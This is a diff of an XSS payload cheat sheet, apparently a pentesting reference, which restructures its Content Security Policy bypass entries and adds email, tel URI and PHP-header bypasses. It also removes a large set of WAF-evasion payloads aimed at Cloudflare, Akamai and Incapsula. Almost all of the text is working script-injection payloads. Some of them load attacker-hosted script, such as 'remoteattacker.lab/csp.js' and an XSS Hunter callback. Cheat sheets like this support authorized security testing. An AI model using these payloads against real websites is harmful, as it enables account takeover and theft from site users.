@@ -76,28 +76,12 @@
     - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
     - [Bypass using jsfuck](#bypass-using-jsfuck)
   - [CSP Bypass](#csp-bypass)
-    - [Bypass CSP using JSONP from Google (Trick by @apfeifer27)](#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27)
-    - [Bypass CSP by lab.wallarm.com](#bypass-csp-by-labwallarmcom)
-    - [Bypass CSP by Rhynorater](#bypass-csp-by-rhynorater)
-    - [Bypass CSP by @akita_zen](#bypass-csp-by-akita_zen)
-    - [Bypass CSP by @404death](#bypass-csp-by-404death)
-  - [Common WAF Bypass](#common-waf-bypass)
-    - [Cloudflare XSS Bypasses by @Bohdan Korzhynskyi](#cloudflare-xss-bypasses-by-bohdan-korzhynskyi)
-      - [25st January 2021](#25st-january-2021)
-      - [21st April 2020](#21st-april-2020)
-      - [22nd August 2019](#22nd-august-2019)
-      - [5th June 2019](#5th-june-2019)
-      - [3rd June 2019](#3rd-june-2019)
-    - [Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)](#cloudflare-xss-bypass---22nd-march-2019-by-rakeshmane10)
-    - [Cloudflare XSS Bypass - 27th February 2018](#cloudflare-xss-bypass---27th-february-2018)
-    - [Chrome Auditor - 9th August 2018](#chrome-auditor---9th-august-2018)
-    - [Incapsula WAF Bypass by @Alra3ees- 8th March 2018](#incapsula-waf-bypass-by-alra3ees--8th-march-2018)
-    - [Incapsula WAF Bypass by @c0d3G33k - 11th September 2018](#incapsula-waf-bypass-by-c0d3g33k---11th-september-2018)
-    - [Incapsula WAF Bypass by @daveysec - 11th May 2019](#incapsula-waf-bypass-by-daveysec---11th-may-2019)
-    - [Akamai WAF Bypass by @zseano - 18th June 2018](#akamai-waf-bypass-by-zseano---18th-june-2018)
-    - [Akamai WAF Bypass by @s0md3v - 28th October 2018](#akamai-waf-bypass-by-s0md3v---28th-october-2018)
-    - [WordFence WAF Bypass by @brutelogic - 12th September 2018](#wordfence-waf-bypass-by-brutelogic---12th-september-2018)
-    - [Fortiweb WAF Bypass by @rezaduty - 9th July 2019](#fortiweb-waf-bypass-by-rezaduty---9th-july-2019)
+    - [Bypass CSP using JSONP](#bypass-csp-using-jsonp)
+    - [Bypass CSP default-src](#bypass-csp-default-src)
+    - [Bypass CSP inline eval](#bypass-csp-inline-eval)
+    - [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)
+    - [Bypass CSP script-src self](#bypass-csp-script-src-self)
+    - [Bypass CSP script-src data](#bypass-csp-script-src-data)
   - [References](#references)
 
 ## Vulnerability Details
@@ -774,13 +758,31 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
+
 ### Bypass email filter
 
-([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))
+* [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
+  ```javascript
+  "><svg/onload=confirm(1)>"@x.y
+  ```
+
+* [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)
+  ```javascript
+  xss@example.com(<img src='x' onerror='alert(document.location)'>)
+  ```
+
+
+### Bypass tel URI filter
+
+At least 2 RFC mention the `;phone-context=` descriptor:
+
+* [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)
+* [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)
 
 ```javascript
-"><svg/onload=confirm(1)>"@x.y
++330011223344;phone-context=<script>alert(0)</script>
 ```
+
 
 ### Bypass document blacklist
 
@@ -1103,156 +1105,142 @@ Bypass using [jsfuck](http://www.jsfuck.com/)
 
 Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://websecblog.com/vulns/google-csp-evaluator/)
 
-### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
 
-//google.com/complete/search?client=chrome&jsonp=alert(1);
+### Bypass CSP using JSONP
+
+**Requirements**:
+
+* CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`
+
+**Payload**:
+
+Use a callback function from a whitelisted source listed in the CSP.
+
+* Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
+* Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
+* Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
+* Youtube: `https://www.youtube.com/oembed?callback=alert;`
+* [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
+* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 
 ```js
 <script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
 ```
 
-More JSONP endpoints:
-* [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
-* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 
-### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
+### Bypass CSP default-src
 
-Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)
+**Requirements**:
+
+* CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, 
+
+**Payload**:
+
+`http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`
 
 ```js
 script=document.createElement('script');
-script.src='//bo0om.ru/csp.js';
+script.src='//remoteattacker.lab/csp.js';
 window.frames[0].document.head.appendChild(script);
 ```
 
-### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
+Source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
+
+
+### Bypass CSP inline eval 
+
+**Requirements**:
+
+* CSP `inline` or `eval`
+
+
+**Payload**:
 
 ```js
-// CSP Bypass with Inline and Eval
 d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
 
-### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
+Source: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
 
-Works for CSP like `script-src self`
+
+### Bypass CSP script-src self 
+
+**Requirements**:
+
+* CSP like `script-src self`
+
+**Payload**:
 
 ```js
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
-### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
+Source: [@akita_zen](https://twitter.com/akita_zen)
 
-Works for CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
+
+### Bypass CSP script-src data
+
+**Requirements**:
+
+* CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
+
+
+**Payload**:
 
 ```javascript
 <script src="data:,alert(1)">/</script>
 ```
 
+Source: [@404death](https://twitter.com/404death/status/1191222237782659072)
 
-## Common WAF Bypass
 
-### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
+### Bypass CSP unsafe-inline
 
-#### 25st January 2021
+**Requirements**:
 
-```html
-<svg/onrandom=random onload=confirm(1)>
-<video onnull=null onmouseover=confirm(1)>
-```
+* CSP: `script-src https://google.com 'unsafe-inline';`
 
-#### 21st April 2020
-
-```html
-<svg/OnLoad="`${prompt``}`">
-```
-
-#### 22nd August 2019
-
-```html
-<svg/onload=%26nbsp;alert`bohdan`+
-```
-
-#### 5th June 2019
-
-```html
-1'"><img/src/onerror=.1|alert``>
-```
-
-#### 3rd June 2019
-
-```html
-<svg onload=prompt%26%230000000040document.domain)>
-<svg onload=prompt%26%23x000000028;document.domain)>
-xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
-```
-
-### Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)
-
-```
-<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
-```
-
-### Cloudflare XSS Bypass - 27th February 2018
-
-```html
-<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
-```
-
-### Chrome Auditor - 9th August 2018
+**Payload**:
 
 ```javascript
-</script><svg><script>alert(1)-%26apos%3B
+"/><script>alert(1);</script>
 ```
 
-Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
 
-### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th March 2018
+### Bypass CSP header sent by PHP
 
-```javascript
-anythinglr00</script><script>alert(document.domain)</script>uxldz
+**Requirements**:
 
-anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+* CSP sent by PHP `header()` function 
+
+
+**Payload**:
+
+In default `php:apache` image configuration, PHP cannot modify headers when the response's data has already been written. This event occurs when a warning is raised by PHP engine.
+
+Here are several ways to generate a warning:
+
+- 1000 $_GET parameters
+- 1000 $_POST parameters
+- 20 $_FILES
+
+If the **Warning** are configured to be displayed you should get these:
+
+* **Warning**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`
+* **Warning**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`
+
+
+```ps1
+GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
 ```
 
-### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th September 2018
+Source: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)
 
-```javascript
-<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
-```
-
-### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th May 2019
-
-```html
-<svg onload\r\n=$.globalEval("al"+"ert()");>
-```
-
-### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018
-
-```javascript
-?"></script><base%20c%3D=href%3Dhttps:\mysite>
-```
-
-### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th October 2018
-
-```html
-<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
-```
-
-### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th September 2018
-
-```javascript
-<a href=javas&#99;ript:alert(1)>
-```
-
-### Fortiweb WAF Bypass by [@rezaduty](https://twitter.com/rezaduty) - 9th July 2019
-
-```javascript
-\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
-```
 
 ## Labs
 
 * [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
+
 
 ## References
 
@@ -1318,3 +1306,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
 - [Bypass < with ＜](https://hackerone.com/reports/639684)
 - [Bypassing Signature-Based XSS Filters: Modifying Script Code](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
+- [Secret Web Hacking Knowledge: CTF Authors Hate These Simple Tricks - Philippe Dourassov - 13 may 2024](https://youtu.be/Sm4G6cAHjWM)
